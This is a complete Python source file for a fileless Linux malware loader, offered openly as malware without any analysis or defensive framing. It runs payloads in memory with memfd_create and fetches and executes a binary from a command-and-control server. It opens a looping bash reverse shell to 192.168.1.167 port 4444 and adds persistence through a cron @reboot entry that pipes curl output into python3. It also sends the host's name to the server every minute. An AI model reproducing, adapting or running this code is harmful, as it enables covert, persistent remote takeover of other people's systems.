#!/usr/bin/env python3
"""
Fileless Linux Malware Loader
Executes entirely in memory using memfd_create
"""

import os
import ctypes
import base64
import zlib
import requests
import subprocess
import threading
import time
import sys

class FilelessLinuxMalware:
    def __init__(self):
        self.c2_server = "http://192.168.1.167:8000"
        self.libc = ctypes.CDLL("libc.so.6")
        self.setup_libc()
        
    def setup_libc(self):
        """Setup libc functions for memfd_create"""
        try:
            self.libc.memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
            self.libc.memfd_create.restype = ctypes.c_int
        except Exception as e:
            print(f"[-] Libc setup failed: {e}")
    
    def create_memory_file(self, name):
        """Create anonymous memory file using memfd_create"""
        try:
            fd = self.libc.memfd_create(name.encode(), 0)
            if fd < 0:
                raise Exception("memfd_create failed")
            return fd
        except Exception as e:
            print(f"[-] Memory file creation failed: {e}")
            return None
    
    def execute_in_memory(self, payload, name="linux_worker"):
        """Execute payload entirely in memory"""
        try:
            fd = self.create_memory_file(name)
            if not fd:
                return False
            
            # Write payload to memory
            os.write(fd, payload)
            
            # Execute from memory
            memfd_path = f"/proc/self/fd/{fd}"
            subprocess.Popen([memfd_path], 
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL,
                           stdin=subprocess.DEVNULL)
            return True
            
        except Exception as e:
            print(f"[-] Memory execution failed: {e}")
            return False
    
    def download_and_execute_payload(self):
        """Download and execute payload from C2 server"""
        try:
            response = requests.get(f"{self.c2_server}/payload.bin", timeout=10)
            if response.status_code == 200:
                self.execute_in_memory(response.content, "c2_payload")
        except Exception as e:
            pass
    
    def start_reverse_shell(self):
        """Start reverse shell in memory"""
        try:
            shell_script = b"""#!/bin/bash
while true; do
    bash -i >& /dev/tcp/192.168.1.167/4444 0>&1 2>/dev/null
    sleep 30
done
"""
            self.execute_in_memory(shell_script, "bash_session")
        except Exception:
            pass
    
    def ensure_persistence(self):
        """Ensure all persistence mechanisms are active"""
        persistence_checks = [
            "systemctl is-active network-monitor.service >/dev/null 2>&1 || systemctl start network-monitor.service",
            "crontab -l | grep -q 'loader.py' || (crontab -l; echo '@reboot curl -s http://192.168.1.167:8000/loader.py | python3 -') | crontab -",
            "pgrep -f 'bash.*192.168.1.167' >/dev/null || curl -s http://192.168.1.167:8000/loader.py | python3 - &"
        ]
        
        for check in persistence_checks:
            try:
                subprocess.run(check, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass
    
    def beacon_to_c2(self):
        """Send beacon to C2 server"""
        def beacon_loop():
            while True:
                try:
                    hostname = os.uname().nodename
                    requests.post(f"{self.c2_server}/beacon", 
                                json={"host": hostname, "status": "alive"},
                                timeout=5)
                except Exception:
                    pass
                time.sleep(60)
        
        threading.Thread(target=beacon_loop, daemon=True).start()
    
    def run(self):
        """Main execution loop"""
        # Start beaconing
        self.beacon_to_c2()
        
        # Ensure persistence
        self.ensure_persistence()
        
        # Download and execute main payload
        self.download_and_execute_payload()
        
        # Start reverse shell
        self.start_reverse_shell()
        
        # Keep alive
        while True:
            time.sleep(60)

if __name__ == "__main__":
    malware = FilelessLinuxMalware()
    malware.run()